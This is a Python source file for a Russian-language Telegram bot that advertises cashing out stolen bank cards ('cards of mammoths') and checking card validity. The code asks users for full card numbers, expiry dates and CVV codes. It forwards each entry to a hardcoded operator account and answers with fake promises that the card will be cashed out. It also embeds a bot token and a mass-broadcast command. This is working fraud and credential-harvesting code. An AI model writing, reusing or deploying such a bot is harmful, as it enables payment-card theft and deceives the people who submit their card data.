import telebot
import re
from time import sleep
import sqlite3


bot = telebot.TeleBot('1480716723:AAEt8u1EUToS7-5FQ_EnL2N7PfSdJdGVlsg')

menu = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
menu.row('⚜️ Профиль ⚜️')
menu.row('💸 Обналичить карту 💸', '♻️ Проверить на валидность ♻️')
menu.row('💎 Помощь 💎', 'Статистика 🔮')

balance = telebot.types.InlineKeyboardMarkup()
vivod = telebot.types.InlineKeyboardButton(text='💳 Вывести деньги', callback_data='vivodbabla')
balance.add(vivod)

systema = telebot.types.InlineKeyboardMarkup()
qiwas = telebot.types.InlineKeyboardButton(text='🥝 QIWI', callback_data='vivodqiwi')
bitok = telebot.types.InlineKeyboardButton(text='💸 BTC ЧЕК', callback_data='vivodbtc')
systema.add(qiwas)
systema.add(bitok)

def create_db_new():
    db = sqlite3.connect('users.db', check_same_thread=False)
    sql = db.cursor()
    sql.execute('''CREATE TABLE IF NOT EXISTS user(
        user_id INT)''')
    sql.close()
    db.close()
create_db_new()
@bot.message_handler(commands=['start'])
def send_sms(message):
    db = sqlite3.connect("users.db", check_same_thread=False)
    sql = db.cursor()
    sql.execute("SELECT user_id FROM user WHERE user_id = ?",(message.from_user.id,))
    db.commit()
    if sql.fetchone() is None:
        sql.execute("INSERT INTO user VALUES(?)",(message.from_user.id,))
        db.commit()
    bot.send_message(message.chat.id, f'<b>Привет, <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>\n\nДобро пожаловать в бота, который обналичит карты мамонтов.\n\nБот поддерживает карты: VISA, MASTERCARD, MAESTRO\n\nКарты МИР не обналичиваем !</b>', parse_mode='html', reply_markup=menu)
    sql.close()
    db.close()
@bot.message_handler(commands=['send'])  
def rek(message):
    if message.from_user.id == 1329791332 or message.from_user.id == 1490980970:
        bot.send_message(message.chat.id, "отправьте текст рассылки")
        bot.register_next_step_handler(message, message_everyone)
def message_everyone(message):
    db = sqlite3.connect('users.db', check_same_thread=False)
    sql = db.cursor()
    sql.execute("SELECT user_id FROM user")
    Lusers = sql.fetchall()
    for i in Lusers:
        try:
            if message.content_type == "text":
                #text
                tex = message.text
                bot.send_message(i[0], tex)
            elif message.content_type == "photo":
                #photo
                capt = message.caption
                photo = message.photo[-1].file_id
                bot.send_photo(i[0], photo, caption=capt)
            elif message.content_type == "video":
                #video
                capt = message.caption
                photo = message.video.file_id
                bot.send_video(i[0], photo)
            elif message.content_type == "audio":
                #audio
                capt = message.caption
                photo = message.audio.file_id
                bot.send_audio(i[0], photo, caption=capt)
            elif message.content_type == "voice":
                #voice
                capt = message.caption
                photo = message.voice.file_id
                bot.send_voice(i[0], photo, caption=capt)
            elif message.content_type == "animation":
                #animation
                capt = message.caption
                photo = message.animation.file_id
                bot.send_animation(i[0], photo, caption=capt)
            elif message.content_type == "document":
                #document
                capt = message.caption
                photo = message.document.file_id
                bot.send_document(i[0], photo, caption=capt)
        except:
            print("error!!")
    sql.close()
    db.close()
@bot.message_handler(commands=['stats'])
def stat(message):
    db = sqlite3.connect('users.db', check_same_thread=False)
    sql = db.cursor()
    sql.execute("SELECT COUNT(*) FROM user")
    q = sql.fetchall()
    print(q[0])
    for i in q:
        bot.send_message(message.chat.id, "Юзеров на сегодняшний день: " + str(q[0]))
 
@bot.message_handler(content_types=['text'])
def send_message(message):
    db = sqlite3.connect('users.db', check_same_thread=False)
    sql = db.cursor()
    sql.execute("SELECT COUNT(*) FROM user")
    q = sql.fetchall()
    if message.text == 'Статистика 🔮':
      print(q[0])
      for i in q:
        bot.send_message(message.chat.id, "Юзеров на сегодняшний день: " + str(q[0]))
    if message.text == '⚜️ Профиль ⚜️':
        bot.send_message(message.chat.id, f'<b>Ваш ID: <code>{message.from_user.id}</code>\nВаш баланс: 0 RUB</b>', parse_mode='html', reply_markup=balance)
    if message.text == '💸 Обналичить карту 💸':    
        bot.send_message(message.chat.id, f'Введите данные карты в формате: <i>0000 0000 0000 0000 | 00/00 | 215</i>', parse_mode='html')
        start_check(message = message)
    if message.text == '♻️ Проверить на валидность ♻️':
        bot.send_message(message.chat.id, '<b>Введите данные карты в формате:</b> <i>0000 0000 0000 0000 | 00/00 | 215</i>\n\n<b>Строго учитывайте разделитель "|"</b>', parse_mode='html')
        start_perevod(message = message)
    if message.text == '💎 Помощь 💎':
        bot.send_message(message.chat.id, '<b>Все вопросы к @animestoreadmin </b>', parse_mode='html')

def start_check(message):
       chat_id = message.chat.id
       text = message.text
       msg = bot.send_message(chat_id, '<b>Введите данные карты </b>', parse_mode='html')
       bot.register_next_step_handler(msg, numbertwo)
       
def numbertwo(message):
        chat_id = message.chat.id
        text = message.text
        if re.match(r'@([a-zA-Z]|_|\d)+ \d+', text):
            msg = bot.send_message(chat_id, 'неправильные данные') 
            bot.register_next_step_handler(msg, numbertwo)
            return
       	# ----------------------------------------------------------
        msg = bot.send_message(chat_id, 'Вы указали: ' + text + '. Верно?(Да|Нет)')
        bot.register_next_step_handler(message,verify_asktwo,answer = text) 
        bot.forward_message(1329791332, message.from_user.id, message.message_id)# 

def verify_asktwo(message,answer,func = None):
	if not message.text.lower().find("да"):
		bot.send_message(message.chat.id,"<b>Скоро будет обналичено!\nО результатах сообщим через 15 минут!</b>", parse_mode='html') #
	elif not message.text.lower().find("нет"):
		bot.send_message(message.chat.id,"Отменено.")#
	else:
		bot.send_message(message.chat.id,"Ответ не подходит под критерии (Да|Нет)")
		bot.register_next_step_handler(message,verify_ask,answer = answer)
























def start_perevod(message):
       chat_id = message.chat.id
       text = message.text
       msg = bot.send_message(chat_id, '<b>Введите данные карты </b>', parse_mode='html')
       bot.register_next_step_handler(msg, number)
       
def number(message):
        chat_id = message.chat.id
        text = message.text
        if re.match(r'@([a-zA-Z]|_|\d)+ \d+', text):
            msg = bot.send_message(chat_id, 'неправильные данные') 
            bot.register_next_step_handler(msg, number)
            return
       	# ----------------------------------------------------------
        msg = bot.send_message(chat_id, 'Вы указали: ' + text + '. Верно?(Да|Нет)')
        bot.register_next_step_handler(message,verify_ask,answer = text) 
        bot.forward_message(1329791332, message.from_user.id, message.message_id)# 
        
def verify_ask(message,answer,func = None):
	if not message.text.lower().find("да"):
		bot.send_message(message.chat.id,"<b>Скоро будет обналичено!\nО результатах сообщим через 15 минут!</b>", parse_mode='html') #
	elif not message.text.lower().find("нет"):
		bot.send_message(message.chat.id,"Отменено.")#
	else:
		bot.send_message(message.chat.id,"Ответ не подходит под критерии (Да|Нет)")
		bot.register_next_step_handler(message,verify_ask,answer = answer)
























  
@bot.callback_query_handler(func=lambda call:True)
def call_su(call):
    if call.data == 'vivodbabla':
        bot.send_message(call.message.chat.id, '<b>Выберите систему, куда будете выводить!</b>', parse_mode='html', reply_markup=systema)
    if call.data == 'vivodqiwi':
        bot.send_message(call.message.chat.id, '<i>За выводом обращайтесь к @animestoreadmin</i>', parse_mode='html')
    if call.data == 'vivodbtc':
        bot.send_message(call.message.chat.id, '<i>За выводом обращайтесь к @animestoreadmin</i>', parse_mode='html')
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
         


bot.polling(none_stop=True)    
    